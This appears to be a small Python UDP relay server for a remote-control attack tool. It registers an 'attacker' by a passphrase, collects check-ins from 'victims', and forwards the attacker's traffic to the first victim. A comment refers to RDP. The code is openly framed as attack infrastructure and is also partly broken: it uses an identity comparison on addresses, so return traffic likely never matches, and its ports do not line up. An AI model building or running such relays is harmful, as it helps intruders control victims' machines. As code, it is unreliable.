import socket
from threading import Thread


# read ab RDP
def forward(server_socket: socket.socket, atacker_ip: tuple, targeted_victim_ip: tuple):
    while 1:
        data, ip = server_socket.recvfrom(1024)
        if ip == atacker_ip:
            server_socket.sendto(data, targeted_victim_ip)
            print('sent to victim')
        elif ip is targeted_victim_ip:
            server_socket.sendto(data, atacker_ip)


def accept_for_new_victims(server_socket_for_new_users: socket.socket, victims_ip_list: list):
    while 1:
        print("waitin for a victim")
        ip = server_socket_for_new_users.recvfrom(1024)[1]
        server_socket_for_new_users.sendto('x'.encode(), ip)
        victims_ip_list.append(ip)


def main():
    attacker_ip = ""
    victims_ip_list = []

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_socket.bind(("0.0.0.0", 42069))

    socket_for_victims = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    socket_for_victims.bind(("0.0.0.0", 4200))

    socket_for_attacker = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    socket_for_attacker.bind(("0.0.0.0", 420))
    data, ip = socket_for_attacker.recvfrom(1024)
    data = data.decode()
    if data == "i am the attacker":
        print("attacker_conected")
        attacker_ip = ip
        socket_for_attacker.sendto('x'.encode(), attacker_ip)
    print(attacker_ip)
    Thread(target=accept_for_new_victims, args=(socket_for_victims, victims_ip_list)).start()
    while not victims_ip_list:
        pass
    targeted_victim_ip = victims_ip_list[0]
    print(targeted_victim_ip, "is the target")
    Thread(target=forward, args=(server_socket, attacker_ip, targeted_victim_ip)).start()


if __name__ == "__main__":
    main()
